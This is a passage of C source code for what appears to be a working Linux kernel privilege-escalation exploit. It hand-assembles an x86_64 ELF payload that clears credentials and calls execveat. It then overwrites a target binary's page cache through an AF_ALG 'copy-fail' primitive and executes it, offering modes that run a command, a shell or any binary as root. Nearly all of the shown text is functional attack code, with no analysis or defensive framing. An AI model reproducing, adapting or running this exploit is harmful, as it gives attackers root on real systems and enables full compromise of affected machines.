    ehdr->e_ident[EI_VERSION] = EV_CURRENT;
    ehdr->e_type = ET_EXEC;
    ehdr->e_machine = EM_X86_64;
    ehdr->e_version = EV_CURRENT;
    ehdr->e_phoff = sizeof(Elf64_Ehdr);
    ehdr->e_ehsize = sizeof(Elf64_Ehdr);
    ehdr->e_phentsize = sizeof(Elf64_Phdr);
    ehdr->e_phnum = 1;

    Elf64_Phdr *phdr = (Elf64_Phdr *)(buf + sizeof(Elf64_Ehdr));
    memset(phdr, 0, sizeof(*phdr));
    phdr->p_type = PT_LOAD;
    phdr->p_flags = PF_R | PF_X;
    phdr->p_vaddr = 0x400000;
    phdr->p_paddr = 0x400000;
    phdr->p_align = 0x1000;

    size_t code_start = sizeof(Elf64_Ehdr) + sizeof(Elf64_Phdr);
    p = code_start;
    p = emit_cred_clear(buf, p);

    B(0x31, 0xc0);
    B(0x50);
    size_t lea_cfg_fd = p;
    B(0x48, 0x8d, 0x0d, 0,0,0,0);
    B(0x51);
    size_t lea_flag = p;
    B(0x48, 0x8d, 0x0d, 0,0,0,0);
    B(0x51);
    size_t lea_argv0 = p;
    B(0x48, 0x8d, 0x3d, 0,0,0,0);
    B(0x57);
    B(0xbf, ROOT_HELPER_FD, 0x00, 0x00, 0x00); /* mov edi, ROOT_HELPER_FD */
    size_t lea_empty = p;
    B(0x48, 0x8d, 0x35, 0,0,0,0);              /* lea rsi, [rip+empty] */
    B(0x48, 0x89, 0xe2);                        /* mov rdx, rsp */
    B(0x45, 0x31, 0xd2);                        /* xor r10d, r10d */
    B(0x41, 0xb8, 0x00, 0x10, 0x00, 0x00);     /* mov r8d, AT_EMPTY_PATH */
    B(0xb8, 0x42, 0x01, 0x00, 0x00, 0x0f, 0x05); /* execveat */
    B(0x6a, 0x01, 0x5f);
    B(0x6a, 0x3c, 0x58, 0x0f, 0x05);

    size_t flag_str = p;
    memcpy(buf + p, REENTRY_FLAG, sizeof(REENTRY_FLAG));
    p += sizeof(REENTRY_FLAG);
    size_t cfg_fd_str = p;
    memcpy(buf + p, "196", 4);
    p += 4;
    size_t argv0_str = p;
    memcpy(buf + p, "root-helper", 12);
    p += 12;
    size_t empty_str = p;
    buf[p++] = 0;

    int32_t cfg_disp = (int32_t)(cfg_fd_str - (lea_cfg_fd + 7));
    int32_t flag_disp = (int32_t)(flag_str - (lea_flag + 7));
    int32_t argv0_disp = (int32_t)(argv0_str - (lea_argv0 + 7));
    int32_t empty_disp = (int32_t)(empty_str - (lea_empty + 7));
    memcpy(buf + lea_cfg_fd + 3, &cfg_disp, 4);
    memcpy(buf + lea_flag + 3, &flag_disp, 4);
    memcpy(buf + lea_argv0 + 3, &argv0_disp, 4);
    memcpy(buf + lea_empty + 3, &empty_disp, 4);

    ehdr->e_entry = 0x400000 + code_start;
    phdr->p_filesz = p;
    phdr->p_memsz = p;
    return p;
}

int main(int argc, char **argv)
{
    if (argc >= 3 && strcmp(argv[1], REENTRY_FLAG) == 0)
        dispatch_reentry(argv[2]);

    struct utsname uts;
    if (uname(&uts) == 0 && strcmp(uts.machine, "x86_64") != 0) {
        fprintf(stderr, "unsupported architecture: %s\n", uts.machine);
        return 1;
    }

    if (argc < 4) {
        fprintf(
            stderr,
            "usage: %s --priv-exec <endpoint> <command> | "
            "--priv-shell <endpoint> <unused> | "
            "--priv-bin <endpoint> <payload_fd> | "
            "--priv-exec-tmpfile <endpoint> <command> | "
            "--priv-shell-tmpfile <endpoint> <unused> | "
            "--priv-bin-tmpfile <endpoint> <payload_fd>\n",
            argv[0]
        );
        return 1;
    }

    uint8_t mode = 0;
    int storage_mode = ROOT_STORAGE_MEMFD;
    const char *first = NULL;
    const char *second = NULL;
    if (strcmp(argv[1], ROOT_CMD_FLAG) == 0) {
        mode = CFG_MODE_CMD;
        first = argv[2];
        second = argv[3];
    } else if (strcmp(argv[1], ROOT_SHELL_FLAG) == 0) {
        mode = CFG_MODE_SHELL;
        first = argv[2];
        second = argv[3];
    } else if (strcmp(argv[1], ROOT_BIN_FLAG) == 0) {
        mode = CFG_MODE_BIN;
        first = argv[2];
        second = argv[3];
    } else if (strcmp(argv[1], ROOT_CMD_TMPFILE_FLAG) == 0) {
        mode = CFG_MODE_CMD;
        storage_mode = ROOT_STORAGE_TMPFILE;
        first = argv[2];
        second = argv[3];
    } else if (strcmp(argv[1], ROOT_SHELL_TMPFILE_FLAG) == 0) {
        mode = CFG_MODE_SHELL;
        storage_mode = ROOT_STORAGE_TMPFILE;
        first = argv[2];
        second = argv[3];
    } else if (strcmp(argv[1], ROOT_BIN_TMPFILE_FLAG) == 0) {
        mode = CFG_MODE_BIN;
        storage_mode = ROOT_STORAGE_TMPFILE;
        first = argv[2];
        second = argv[3];
    } else {
        fprintf(stderr, "unsupported mode: %s\n", argv[1]);
        return 1;
    }

    if (mode == CFG_MODE_BIN && prepare_root_binary_storage(first, storage_mode) < 0) {
        perror("prepare root binary storage");
        return 1;
    }

    if (write_config_fd(mode, first, second, storage_mode) < 0) {
        perror("write config fd");
        return 1;
    }

    unsigned char payload[4096];
    size_t payload_len = build_payload(payload);
    int file_fd = open(DEFAULT_TARGET, O_RDONLY);
    if (file_fd < 0) {
        perror(DEFAULT_TARGET);
        return 1;
    }
    posix_fadvise(file_fd, 0, 0, POSIX_FADV_DONTNEED);

    for (size_t i = 0; i < payload_len; i += 4) {
        size_t chunk = payload_len - i;
        if (chunk > 4) chunk = 4;
        if (corrupt_page_cache(file_fd, i, payload + i, chunk) < 0) {
            fprintf(stderr, "AF_ALG unavailable or copy-fail primitive failed\n");
            close(file_fd);
            return 1;
        }
    }
    close(file_fd);
    execl(DEFAULT_TARGET, DEFAULT_TARGET, NULL);
    perror(DEFAULT_TARGET);
    return 1;
}
